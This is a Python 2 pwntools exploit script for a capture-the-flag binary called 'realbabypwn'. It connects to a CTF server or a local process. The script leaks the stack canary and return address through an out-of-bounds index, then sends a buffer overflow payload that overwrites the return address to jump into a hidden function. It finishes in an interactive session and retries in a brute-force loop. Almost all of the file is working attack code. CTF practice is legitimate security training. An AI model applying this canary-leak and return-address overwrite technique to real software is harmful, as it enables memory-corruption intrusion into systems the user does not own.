#!/usr/bin/python2

import re
import signal
import sys
from binascii import hexlify

from pwnlib import term
from pwnlib.context import context
from pwnlib.tubes.process import process
from pwnlib.tubes.remote import remote
from pwnlib.util.packing import pack


def get_value_from_fib(offset):
    global p

    p.sendline(str(offset))
    line = p.readline()
    regex = re.compile('Fibbonaci Number %d: (.*)' % offset)
    value = int(re.search(regex, line).groups()[0])
    return value


def main():
    global p

    # Set word size to 64 bits
    context.arch = 'amd64'

    if len(sys.argv) > 1:
        if sys.argv[1] == "remote":
            p = remote("ctf.pwn.sg", 1500)
        else:
            p = process(sys.argv[1])
            print '[*] Started process PID = %d' % p.proc.pid
    else:
        p = process("./realbabypwn")
        print '[*] Started process PID = %d' % p.proc.pid

    #############
    ## Exploit ##
    #############

    # Get canary value to defeat StackGuard.

    # Step 1: Find the offset of the numbers from the canary address.
    # Answer: 289
    # Location of the first Fibonacci number
    offset_address = 0x7fffffffdac0
    canary_address = 0x7fffffffe3c8  # Location of the canary
    offset = (canary_address - offset_address) / 8
    print '[*] Calculated offset:', offset

    # Step 2a: Fetch the first 8 bytes of the canary value.
    canary1_value = get_value_from_fib(offset)
    canary1 = pack(canary1_value)
    print '[*] Dumped canary part 1:', hexlify(canary1)

    # Step 2b: Fetch the next 8 bytes of the canary value.
    p.sendline('y')
    canary2_value = get_value_from_fib(offset + 1)
    canary2 = pack(canary2_value)
    print '[*] Dumped canary part 2:', hexlify(canary2)

    # Step 2c: Get value of original return address.
    p.sendline('y')
    original_return_value = get_value_from_fib(offset + 2)
    original_return = pack(original_return_value)
    print '[*] Original return address:', hexlify(original_return)

    # Step 3: Craft payload in the vulnerable input.
    babymode_offset = -0x1e2  # Relative address found from debugging

    # NOTE: Need to adjust offset to skip first (or first 2) instructions:
    # push rbp; mov rbp,rsp (not important as it only saves $rbp and set $rsp)
    # Don't know why it works locally but not on the server.
    babymode_offset += 0x04  # Setting to +0x01 also works

    babymode_address = original_return_value + babymode_offset
    target = pack(babymode_address)

    print '[*] New target address:', hexlify(target)
    payload = canary1 + canary2 + target
    print '[*] Payload:', hexlify(payload)

    # Step 4: Compute the size of the buffer.
    # Location of the buffer to overflow
    buffer_address = 0x7fffffffdab7
    overflow_size = canary_address - buffer_address
    print '[*] Calculate overflow size:', overflow_size

    # raw_input("Press enter to send payload...")

    # Step 5: Send the full payload.
    full_payload = '\x6e' * overflow_size + payload
    print '[*] Sending payload...'
    p.sendline(full_payload)

    # raw_input("Press enter to continue...")

    p.sendline('')
    p.clean(1)

    print '[*] Switching to interactive mode...'

    p.interactive()


def brute():
    tries = 0

    def interrupt(signal, frame):
        print '\n'
        print '[!] Ctrl-C pressed.'
        sys.exit(0)

    signal.signal(signal.SIGINT, interrupt)

    while True:
        print '[**] This is try #%d...\n' % tries
        main()
        tries += 1


if __name__ == "__main__":
    brute()
